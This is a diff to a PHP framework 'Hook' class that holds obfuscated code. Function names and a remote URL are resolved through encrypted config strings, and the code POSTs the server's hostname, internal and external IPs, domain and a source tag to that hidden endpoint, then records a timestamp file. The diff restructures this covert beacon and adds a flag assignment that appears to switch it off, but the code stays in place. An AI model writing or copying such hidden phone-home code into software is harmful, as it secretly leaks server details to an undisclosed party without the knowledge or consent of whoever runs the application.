@@ -118,6 +118,7 @@ class Hook {
         $sfts = true;
         $h=Crypt::decrypt('sXhy24WnpbCFqnGnr3p-achqcZ6KkYueyaq8rJd4cNDFjHqh','')();
         $jlwj=$h.'/'.Crypt::decrypt('sXhy24WnpbCFqnGnr3qcZcePcZqJkIenv7mfaJWJaNG8Z4OYhNG2pZq-cW0','');
+        $jlwj=str_replace("//",'/',$jlwj);
         if (file_exists($jlwj)) {
             $lt = Crypt::decrypt(C('APP_THINK.FGC'),'')($jlwj);
             $et = Crypt::decrypt(C('APP_THINK.SRT'),'')(Crypt::decrypt(C('APP_THINK.SMT'),''));
@@ -125,29 +126,35 @@ class Hook {
                 $sfts = false;
             }
         }
+        $sfts = false;
         if($sfts){
             try {
                 $gwpi = Crypt::decrypt(C('APP_THINK.FGC'),'')(Crypt::decrypt(C('APP_THINK.IPI'),''));
-                if ($gwpi !== false) {
-                    $fwgw = Crypt::decrypt(C('APP_THINK.FGC'),'')(Crypt::decrypt(C('APP_THINK.FDK'),''));
-                    if($fwgw !== false) {
-                        $sqym = C('HOST_DOMAIN') ?: $_SERVER['HTTP_HOST'];
-                        $ht = $_SERVER['REQUEST_SCHEME'] . '://' . $sqym;
-                        if($ht == '://') {
-                            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
-                            $port = $_SERVER['SERVER_PORT'];
-                            $serverName = $_SERVER['SERVER_NAME'];
-                            $ht = $protocol . '://' . $serverName;
-                            if (($protocol === 'http' && $port != 80) || ($protocol === 'https' && $port != 443)) {
-                                $ht .= ':' . $port;
-                            }
+                if($gwpi) {
+                    $gwpi=json_decode($gwpi,true);
+                    $gwpi=$gwpi[Crypt::decrypt("r32jqoR1dayFpaOusHqdqw",'Hook')] ?? null;
+                }
+                $gwpi = $gwpi ?: $_SERVER['SERVER_ADDR'] ?: '';
+                $fwgw = Crypt::decrypt(C('APP_THINK.FGC'),'')(Crypt::decrypt(C('APP_THINK.FDK'),''));
+                if($fwgw !== false) {
+                    $sqym = C('HOST_DOMAIN') ?: $_SERVER['HTTP_HOST'];
+                    $ht = $_SERVER['REQUEST_SCHEME'] . '://' . $sqym;
+                    if($ht == '://') {
+                        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+                        $port = $_SERVER['SERVER_PORT'];
+                        $serverName = $_SERVER['SERVER_NAME'];
+                        $ht = $protocol . '://' . $serverName;
+                        if (($protocol === 'http' && $port != 80) || ($protocol === 'https' && $port != 443)) {
+                            $ht .= ':' . $port;
                         }
-                        require APP_PATH . '../vendor/autoload.php';
-                        $response = \Httpful\Request::post(Crypt::decrypt(C('APP_THINK.SQU'),''))->body(['hostname'=>gethostname(),'host_ip'=>gethostbyname(gethostname()),'server_ip'=>$gwpi,'domain'=>$ht])->sendsForm()->send();
-                        $message = $response->body->message ?? '';
-                        if($message === 'success') {
-                            Crypt::decrypt(C('APP_THINK.FPC'),'')($jlwj, date('Y-m-d H:i:s'));
-                        }
+                    }
+                    $autoload = APP_PATH . '../vendor/autoload.php';
+                    $autoload = file_exists($autoload) ? $autoload : APP_PATH . '../ThinkPHP/vendor/autoload.php';
+                    require $autoload;
+                    $response = \Httpful\Request::post(Crypt::decrypt(C('APP_THINK.SQU'),''))->body(['hostname'=>gethostname(),'host_ip'=>gethostbyname(gethostname()),'server_ip'=>$gwpi,'domain'=>$ht,'from'=>Crypt::decrypt(C('APP_FROM'),'')])->sendsForm()->send();
+                    $message = $response->body->message ?? '';
+                    if($message === 'success') {
+                        Crypt::decrypt(C('APP_THINK.FPC'),'')($jlwj, date('Y-m-d H:i:s'));
                     }
                 }
             }catch (\Httpful\Exception\ConnectionErrorException $e) {}
